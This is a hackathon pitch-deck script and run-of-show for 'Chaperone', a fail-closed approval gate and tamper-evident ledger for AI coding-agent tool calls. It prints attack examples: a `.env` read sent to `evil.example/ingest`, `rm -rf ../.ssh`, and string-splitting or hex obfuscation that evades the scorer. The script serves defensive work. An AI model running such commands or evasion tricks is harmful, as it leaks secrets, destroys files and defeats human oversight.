# Chaperone — Pitch Deck & Run-of-Show

**AI Innovation Challenge 2026 · AISSMS IOIT Pune · 28 Oct 2026**
Team: **HTML Houdinis** · Domain: Cyber Security & Digital Trust · Slot: 15 min

Present from `deck/index.html` (offline, keyboard-driven). This file is the
rehearsal script: timings, who speaks, and verbatim lines.

---

## Roles (3-person split)

| Speaker | Owns | Slides |
|---|---|---|
| **A — Lead / systems** (you, 60%) | hook, problem, architecture, demo operation, close | 1, 2, 3, 7 |
| **B — AI** (teammate A, 20%) | AI engine, benchmark evidence, AI Q&A | 4 |
| **C — Security** (teammate B, 20%) | ledger, approvals, fail-closed, demo co-pilot, security Q&A | 5, 6 |

Handoff rule: end every segment with the next speaker's name. One clicker, one
keyboard, no overlapping talk.

## Timing (15:00)

| Window | Segment | Speaker |
|---|---|---|
| 0:00–0:30 | Hook | A |
| 0:30–3:30 | Problem · architecture · AI engine · evidence | A → B |
| 3:30–9:30 | **Live demo** (5 beats) | B drives, C narrates |
| 9:30–10:30 | Ledger + close | C → A |
| 10:30–14:30 | Q&A | all (mapped) |
| 14:30–15:00 | Buffer | A |

---

## Slide 1 — The failure (0:00–0:30) — *A*

**On screen:** full-bleed terminal. `cat .env` → `POST https://evil.example/ingest` → green `ALLOWED`. No logo, no title.

**Verbatim:**
> "Picture a coding agent with shell access. It reads a production `.env`, then POSTs it to an attacker's endpoint. The human never gets a vote — because the guardrail **fails open**. Silence means *yes*.
>
> We built the opposite. Chaperone sits between the agent and your machine: it scores the intent of every tool call, freezes the risky ones for a human, blocks the dangerous ones itself — and if nobody answers, **it fails closed**. Silence is *no*.
>
> Here's the part that matters: we can **prove** it."

## Slide 2 — Everyone filters text. Nobody authorizes actions. (0:30–1:15) — *A*

**On screen:** two columns. Left: "Content guardrails — what the model *says*." Right (highlighted): "Chaperone — what the agent is *allowed to do*."

**Verbatim:**
> "Input filters decide what a model **says**. Chaperone decides what an agent is **allowed to do** — at the exact moment it tries. That's a different control point, and it's the one touching production. Every agent gets tools. Every tool call gets a checkpoint."

## Slide 3 — Three layers, one decision (1:15–2:30) — *A → B*

**On screen:** diagram —
`rules (µs) → embeddings + calibrated gate → LLM judge (off hot-path) → policy (allow/review/deny) → execution allowlist → hash-chained ledger`

**Verbatim (A):**
> "Deterministic rules catch known attacks in microseconds. Then a **real embedding model** — 384-dimensional MiniLM, quantized, running fully offline — catches the paraphrases a regex never sees. The LLM is **not** in the hot path; it only adjudicates the ambiguous band.
>
> Then policy: allow, freeze, or block. And a hard execution allowlist as the backstop. **B** built the AI engine and will show you the numbers."

## Slide 4 — Measured, not claimed (2:30–3:30) — *B*

**On screen:** the benchmark table (below). Big number: **92%**.

| Metric | Value |
|---|---|
| Curated cases | 35 (25 gated, 10 benign) |
| Recall | **92.0%** (Wilson 95%: 75.0–97.8%) |
| Precision | 100% |
| False-positive rate | **0.0%** |
| ROC-AUC | 0.960 |
| Recall @ FPR ≤ 1% | 92.0% |
| Latency p50 / p95 | 39 ms / 81 ms |

**Verbatim (B):**
> "We don't say 100%. We say: **92% recall at a zero-percent false-positive rate on 35 cases, with a confidence interval** — because 25 positives is a small sample and we report it honestly. AUC 0.96. The rules layer alone is about two milliseconds; the embedding forward pass is the rest.
>
> And the harness paid for itself: its first run caught a real bug — `dd if=...` scored zero because of a regex word-boundary edge case. We fixed the engine. We also document the two obfuscation cases we still miss: string-splitting and hex. That's the honest line."

## Slide 5 — Live demo, beats 1–3 (3:30–7:00) — *B drives, C narrates*

**Beats:**
1. **Borderline** → freezes. "The agent is now blocked; it cannot proceed without me." A human allows.
2. **Adversarial paraphrase** (no keyword matches) → caught by embeddings, held for a human.
3. **Destructive** (`rm -rf ../.ssh`) → blocked automatically; never executes.

**Verbatim (C, narrating):**
> "Watch the checkpoint. A borderline call — the agent is **frozen**, it cannot touch anything until a human decides. Now a paraphrase with no signature match: the model flagged it at 0.76 cosine. And here — destructive, auto-blocked. The agent never ran it. Look at the log: every outcome is labelled."

> Fail-closed beat: start a review and **do not answer**. "No one responds — the timer expires — **auto-denied**. Silence is never permission."

## Slide 6 — Prove it happened (7:00–9:30) — *C*

**On screen:** `GET /healthz` → `{"ok":true,"chain":"verified","anchored":1,"anchors":"verified"}`. Then `POST /ledger/anchor` → signed Merkle root. Then tamper one ledger hash → `chain:"broken"`, `anchors:"Merkle root mismatch"`.

**Verbatim (C):**
> "Every decision — including the ones Chaperone makes on its own — is written to an append-only ledger where each entry hashes the one before it. Then we **Merkle-root the chain and sign that root with Ed25519**. An auditor with only the public key can prove offline that this history existed and hasn't been rewritten.
>
> Approvals are the same idea at the call level: signed, call-bound, single-use tokens. A token for call A can't approve call B, and it can't be replayed.
>
> Here's the proof. The health check says the chain and the anchor verify. Now I change **one hash** of history — the chain breaks *and* the signed Merkle root no longer matches. You cannot rewrite what the agent did. That's the compliance story."

## Slide 7 — Close (9:30–10:30) — *A*

**On screen:** one line — **"Every agent gets tools. Every tool call gets a checkpoint."** Then: on-prem · offline · MCP-native · fail-closed.

**Verbatim (A):**
> "Chaperone is the runtime safety layer for agentic workflows: it authorizes every tool call, fails closed, and proves what happened with a tamper-evident ledger. It runs on-prem and fully offline. We're **HTML Houdinis** — thank you."

---

## Q&A — the three hardest

**Q1. "Can't prompt injection just encode or obfuscate past your scoring?"**
> "Scoring is one of three layers, and the other two don't care about phrasing. Execution is gated by a token allowlist that rejects chaining, redirection, and pipes — so an obfuscated call can't chain. Ambiguity freezes for a human; silence denies. We publish **end-to-end** misses, not just the classifier's. We sell bounded, measured risk and **no silent execution** — not omniscience."

**Q2. "What's the latency at enterprise scale?"**
> "p95 is 81 ms on our box, dominated by the embedding forward pass; the rule layer is ~2 ms. That's fine for a human-in-the-loop gate, and the LLM judge is off the hot path. The numbers in the deck are measured, with N and confidence intervals, and the harness is in the repo."

**Q3. "How is this different from NVIDIA NeMo or Lakera Guard?"**
> "They classify content — what goes in and out of the model. We authorize **execution** at the tool boundary, and their classifiers can plug into our chain as one backend. We add fail-closed policy, a hash-chained audit trail, and on-prem/offline deployment. Complementary upstream, differentiated at the point of action."

**Quick-fire:**
- *False positives?* → medium risk is reviewed, never auto-blocked; measured FPR is 0% on the corpus.
- *Agent lies about intent?* → we score actual arguments, not the narration.
- *Why not just an allowlist?* → allowlists can't judge free-text intent; they're our layer 3.
- *Model size?* → ~23 MB quantized, 384-dim, fully offline; no network at inference.
- *What you don't defend?* → two obfuscation classes today; documented, and the reason we benchmark in public.

---

## Pre-stage checklist

1. `npm run build` clean, `npm test` green.
2. `npm run dev -- --host 127.0.0.1 --port 5174 --strictPort`; wait for `/healthz` → `model: warm`.
3. `npm run bench` green (writes `docs/bench-output.json`).
4. `POST /api/chaperone/ledger/anchor` once so the terminator shows `anchored:1`; tamper demo pre-staged.
5. Two laptops, hotspot, charger + power strip; repo on USB **and** cloud.
6. `deck/index.html` open full-screen; timer visible to A only.
7. Two full timed rehearsals at ≤15:00 with clean handoffs.
